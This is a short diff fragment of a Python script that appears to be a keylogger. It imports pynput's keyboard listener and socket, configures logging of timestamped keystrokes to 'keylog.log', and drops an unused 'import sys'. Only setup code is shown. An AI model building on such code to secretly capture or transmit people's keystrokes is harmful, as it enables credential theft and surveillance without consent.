@@ -1,7 +1,6 @@
 from pynput.keyboard import Key, Listener
 import logging
 import socket
-import sys
 
 
 logging.basicConfig(filename=("keylog.log"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
